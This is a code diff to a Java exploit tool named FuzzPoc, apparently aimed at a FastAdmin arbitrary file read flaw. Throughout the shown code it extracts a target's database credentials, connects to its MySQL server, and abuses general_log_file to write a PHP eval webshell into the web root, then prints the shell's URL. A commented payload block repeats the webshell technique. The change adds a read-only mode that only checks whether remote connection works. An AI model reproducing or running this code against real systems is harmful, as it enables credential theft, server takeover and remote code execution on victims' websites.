@@ -88,7 +88,7 @@ public class FuzzPoc {
                 System.out.println("\033[32;1m[+]Target:" + url + " is alive" + "\033[0m");
             }
         } catch (Exception e) {
-            System.out.println("\033[31;1m[-] cannot connect to " + url + "\033[0m");
+            System.out.println("\033[31;1m[-]无法连接:" + url + "\033[0m");
         }
     }
 
@@ -104,7 +104,7 @@ public class FuzzPoc {
         // 发送请求并获取响应
         HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());
         if (response.statusCode() != 200){
-            throw new RuntimeException("\033[31;1m[+] cannot connect to " + urlFuzz_1 + "\033[0m");
+            System.out.println("\033[31;1m[-]无法连接:" + urlFuzz_1 + "\033[0m");
         }else {
             String respText = response.body();
             // 定义正则表达式,匹配数据
@@ -118,19 +118,25 @@ public class FuzzPoc {
                 String key = matcher.group(1);  // 字段名 (hostname, username, etc.)
                 String value = matcher.group(2);  // 字段值 (localhost, admin, etc.)
                 sqlMap.put(key,value);
-                System.out.println("\033[32;1m[+]" + key + ":" + value  + "\033[0m");
             }
+            System.out.println("\033[33;1m[+]" +
+                               "Host:" + sqlMap.get("hostname") +
+                               ",Port:" + sqlMap.get("hostport") +
+                               ",Database:" + sqlMap.get("database") +
+                               ",Username:" + sqlMap.get("username") +
+                               ",Password:" + sqlMap.get("password") + "\033[0m");
             Connection connection = MySQLTest.TestConnect(this.ip,sqlMap.get("hostport"),sqlMap.get("database"),sqlMap.get("username"),sqlMap.get("password"));
             if (connection != null)
             {
-                // 创建 Statement 对象
-                Statement statement = connection.createStatement();
-                String version="";
-                String basedir="";
-                String ShellCmd = getRandomString();
-                // 执行 SQL 查询：获取 MySQL 版本
-                String sql = "SELECT VERSION();";
-                ResultSet resultSet = statement.executeQuery(sql);
+                if (!CmdArgs.ifRead){
+                    // 创建 Statement 对象
+                    Statement statement = connection.createStatement();
+                    String version="";
+                    String basedir="";
+                    String ShellCmd = getRandomString();
+                    // 执行 SQL 查询：获取 MySQL 版本
+                    String sql = "SELECT VERSION();";
+                    ResultSet resultSet = statement.executeQuery(sql);
             /*
             select @@basedir;
             show variables like '%general%';
@@ -138,34 +144,37 @@ public class FuzzPoc {
             set global general_log_file = 'D:/WWWSC/www/public/api.php';
             select '<?php eval($_REQUEST["x"]);?>';
             */
-                // 处理查询结果
-                if (resultSet.next()) {
-                    version = resultSet.getString(1);
-                    System.out.println("\033[32;1m[+]" + "目标数据库MySQL版本: " + version + "\033[0m");
-                }
-                sql = "select @@basedir;";
-                resultSet = statement.executeQuery(sql);
-                if (resultSet.next()) {
-                    basedir = resultSet.getString(1);
-                    System.out.println("\033[32;1m[+]" + "目标数据库根路径为: " + basedir + "\033[0m");
-                }
-                String ShellPath = basedir.substring(0,basedir.indexOf("mysql")) + "www/public/api.php";
-                sql = "set global general_log = on;";
-                statement.execute(sql);
-                sql = "set global general_log_file = '" +  ShellPath + "';";
-                statement.execute(sql);
+                    // 处理查询结果
+                    if (resultSet.next()) {
+                        version = resultSet.getString(1);
+                        System.out.println("\033[32;1m[+]" + "目标数据库MySQL版本: " + version + "\033[0m");
+                    }
+                    sql = "select @@basedir;";
+                    resultSet = statement.executeQuery(sql);
+                    if (resultSet.next()) {
+                        basedir = resultSet.getString(1);
+                        System.out.println("\033[32;1m[+]" + "目标数据库根路径为: " + basedir + "\033[0m");
+                    }
+                    String ShellPath = basedir.substring(0,basedir.indexOf("mysql")) + "www/public/api.php";
+                    sql = "set global general_log = on;";
+                    statement.execute(sql);
+                    sql = "set global general_log_file = '" +  ShellPath + "';";
+                    statement.execute(sql);
 
-                sql = "select '<?php echo eval($_POST[\"" + ShellCmd +"\"]);?>';";
-                statement.execute(sql);
-                sql = "set global general_log = off;";
-                statement.execute(sql);
-                System.out.println("\033[32;1m[+]" + "目标网站Shell已经写入\033[0m");
-                System.out.println("\033[32;1m[+]" + "访问" + this.url + "api.php/?" + ShellCmd + "\033[0m");
-                // 关闭连接
+                    sql = "select '<?php echo eval($_POST[\"" + ShellCmd +"\"]);?>';";
+                    statement.execute(sql);
+                    sql = "set global general_log = off;";
+                    statement.execute(sql);
+                    System.out.println("\033[32;1m[+]" + "目标网站Shell已经写入\033[0m");
+                    System.out.println("\033[32;1m[+]" + "访问" + this.url + "api.php/?" + ShellCmd + "\033[0m");
+                    // 关闭连接
+                }else {
+                    System.out.println("\033[32;1m[+]" + "目标数据库可远程连接!\033[0m");
+                }
                 connection.close();
             }
             else {
-                System.out.println("\033[31;1m[-]" + "不存在FastAdmin任意文件读取漏洞!" + "\033[0m");
+                System.out.println("\033[31;1m[-]" + "目标数据库不支持远程连接!" + "\033[0m");
             }
         }
     }
